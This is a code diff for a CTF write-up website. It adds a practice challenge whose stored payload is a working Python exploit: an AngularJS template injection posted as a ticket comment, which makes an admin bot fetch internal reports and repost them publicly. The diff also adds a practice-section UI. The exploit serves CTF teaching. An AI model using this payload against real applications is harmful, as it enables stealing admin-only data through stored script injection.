@@ -653,7 +653,33 @@ encoded_flag = "U290ZXJDVEZ7RDNmZW41RV9zMVNUM21fZEk1NWFCbGVkfQ=="
 decoded = base64.b64decode(encoded_flag).decode('utf-8')
 
 print("Decoded Base64:", decoded)
-# Decoded Base64: SoterCTF{D3fen5E_s1ST3m_dI55aBled}` }
+# Decoded Base64: SoterCTF{D3fen5E_s1ST3m_dI55aBled}` },
+  { id: 27, points: 300, practice: true, flag: "SoterCTF{cst1_2_adm1n_p1v0t_h3l1xc0rp_rc3_r3p0rt}", url: "http://194.163.178.87:6767/", payload: `import urllib.request, json
+
+TARGET = "http://194.163.178.87:6767"
+TID = "10"
+sid = open("cookies.txt").read().split("connect.sid")[1].split()[0]  # o cópiala a mano
+
+# CSTI en AngularJS 1.6.9 (sandbox eliminado): el bot admin ejecuta
+# {{constructor.constructor('JS')()}} en su navegador headless.
+js = (
+ "fetch(\`/api/tickets/%s/comments\`).then(r=>r.json()).then(c=>{"
+ "if(c.comments.some(x=>String(x.content).indexOf(\`PWN::\`)===0))return;"
+ "fetch(\`/api/internal/reports\`).then(r=>r.json()).then(d=>fetch(\`/api/internal/reports/\`+d.reports[0].id))"
+ ".then(r=>r.text()).then(t=>fetch(\`/tickets/%s/comments\`,{method:\`POST\`,"
+ "headers:{[\`Content-Type\`]:\`application/json\`},body:JSON.stringify({content:\`PWN::\`+t})}))"
+ "})"
+) % (TID, TID)
+
+payload = "{{constructor.constructor('%s')()}}" % js
+body = json.dumps({"content": payload}).encode()
+req = urllib.request.Request(f"{TARGET}/tickets/{TID}/comments", data=body,
+    headers={"Content-Type": "application/json", "Cookie": f"connect.sid={sid}"})
+print(urllib.request.urlopen(req, timeout=15).read().decode())  # {"success":true}
+
+# El bot de triage reabre el ticket comentado en ~15s, ejecuta el JS
+# como admin y publica el informe interno de vuelta como comentario "PWN::...".
+# Flag: SoterCTF{cst1_2_adm1n_p1v0t_h3l1xc0rp_rc3_r3p0rt}` }
 ];
 
 function App() {
@@ -665,20 +691,24 @@ function App() {
     const staticInfo = staticChallengeData.find(s => s.id === challenge.id);
     return { ...challenge, ...staticInfo };
   }).sort((a, b) => b.points - a.points);
+
+  const competitionChallenges = fullChallengeData.filter(challenge => !challenge.practice);
+  const practiceChallenges = fullChallengeData.filter(challenge => challenge.practice);
+
   return (
     <div className="flex flex-col min-h-screen">
       <Header />
-      
+
       <main className="container flex-grow" style={{ maxWidth: '800px', width: '100%' }}>
         <Hero />
-        
+
         <div id="writeups" className="animate-fade-in" style={{ animationDelay: '400ms', animationFillMode: 'both' }}>
           <h2 style={{ fontSize: '2rem', marginBottom: '2rem', color: 'var(--text-main)', borderBottom: '1px solid var(--border-color)', paddingBottom: '0.5rem' }}>
             {t('featured')}
           </h2>
-          
+
           <div className="flex flex-col gap-4">
-            {fullChallengeData.map((challenge) => (
+            {competitionChallenges.map((challenge) => (
               <ChallengeCard
                 key={challenge.id}
                 category={challenge.category}
@@ -692,6 +722,29 @@ function App() {
             ))}
           </div>
         </div>
+
+        {practiceChallenges.length > 0 && (
+          <div id="practice-writeups" className="animate-fade-in" style={{ marginTop: '3rem', animationDelay: '400ms', animationFillMode: 'both' }}>
+            <h2 style={{ fontSize: '2rem', marginBottom: '2rem', color: 'var(--text-main)', borderBottom: '1px solid var(--border-color)', paddingBottom: '0.5rem' }}>
+              {t('practice')}
+            </h2>
+
+            <div className="flex flex-col gap-4">
+              {practiceChallenges.map((challenge) => (
+                <ChallengeCard
+                  key={challenge.id}
+                  category={challenge.category}
+                  name={challenge.name}
+                  points={challenge.points}
+                  description={challenge.description}
+                  resolution={challenge.resolution}
+                  flag={challenge.flag}
+                  payload={challenge.payload}
+                />
+              ))}
+            </div>
+          </div>
+        )}
       </main>
 
       <Footer />
